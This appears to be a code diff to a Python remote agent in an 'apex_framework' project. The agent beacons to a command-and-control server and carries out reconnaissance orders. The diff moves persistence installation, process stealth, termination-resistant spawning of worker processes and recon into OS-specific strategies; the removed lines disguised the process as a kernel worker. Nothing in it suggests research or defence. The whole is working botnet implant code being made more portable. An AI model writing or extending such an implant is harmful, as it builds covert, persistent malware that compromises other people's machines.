@@ -3,12 +3,9 @@ import requests
 import json
 import random
 import signal
-from apex_framework.ops.stealth import LowObservableMode
-from apex_framework.ops.privacy import PrivacyManager
-from apex_framework.ops.daemon import ServiceDaemon
+import sys
+from apex_framework.core.hal import PlatformHAL
 from apex_framework.ops.resilience import ResilienceManager
-from apex_framework.ops.discovery import AssetDiscovery
-from apex_framework.ops.mimicry import BehavioralMimic
 from apex_framework.ops.stealth_ops import StealthOperations
 from rich.console import Console
 
@@ -17,32 +14,41 @@ console = Console()
 class RemoteAgent:
     """
     Remote Agent.
-    INTEGRATED: Stealth Ops (Whispers).
+    Connects to Central Controller and executes orders.
+    INTEGRATED: Universal OS Support via HAL.
     """
     def __init__(self, c2_url="http://localhost:8080"):
         self.id = f"AGENT_{random.randint(1000,9999)}"
         self.c2_url = c2_url
         self.active = True
-        self.titan = PrivacyManager()
-        self.hydra = ServiceDaemon()
-        self.mimic = BehavioralMimic()
+        self.os_strategy = PlatformHAL.detect() # Dynamic OS Loading
         self.whisper = StealthOperations()
 
     def deploy(self):
-        self.titan.deploy()
-        self.hydra.persist()
-        LowObservableMode.cloak_process()
+        # 1. OS-Specific Persistence & Stealth
+        self.os_strategy.install_persistence()
+        self.os_strategy.engage_stealth()
+
+        # 2. Universal Resilience
         ResilienceManager.plant_seed()
 
-        # USE WHISPER TO WRITE LOG
-        self.whisper.ghost_write("agent_startup.log", f"Deployed {self.id}")
+        # 3. Spawn Brood
+        # Note: multiprocessing fork might behave differently on Win/Android
+        # We wrap in try/except for compatibility
+        try:
+            # On Linux only for now for signals
+            if sys.platform != "win32":
+                signal.signal(signal.SIGTERM, ResilienceManager.handle_termination)
 
-        signal.signal(signal.SIGTERM, ResilienceManager.handle_termination)
-        larvae = ResilienceManager.spawn_brood(count=3, target_func=self._larva_lifecycle)
-        for l in larvae: l.join()
+            larvae = ResilienceManager.spawn_brood(count=3, target_func=self._larva_lifecycle)
+            console.print(f"[{self.id}] 👑 Overseer Active. Monitoring {len(larvae)} Larvae.")
+            for l in larvae: l.join()
+        except Exception as e:
+            console.print(f"[AGENT] ⚠️ Brood Spawn failed (OS Limit?): {e}. Running Solo.")
+            self._larva_lifecycle("SOLO")
 
     def _larva_lifecycle(self, identity):
-        LowObservableMode.cloak_process(f"[kworker/u4:{random.randint(1,9)}]")
+        console.print(f"[{identity}] 🚀 Active. Connecting to {self.c2_url}")
         while self.active:
             try:
                 requests.post(f"{self.c2_url}/beacon", json={"id": f"{self.id}_{identity}", "status": "ALIVE"})
@@ -50,8 +56,8 @@ class RemoteAgent:
                 if resp.status_code == 200:
                     orders = resp.json()
                     if orders.get('type') == "RECON_2026":
-                        recon = AssetDiscovery(".")
-                        self.mimic.execute_with_mimicry(recon.scan_mass_scale)
+                        # Delegate Recon to OS Strategy
+                        self.os_strategy.perform_recon()
                 time.sleep(2)
             except Exception as e:
                 time.sleep(2)
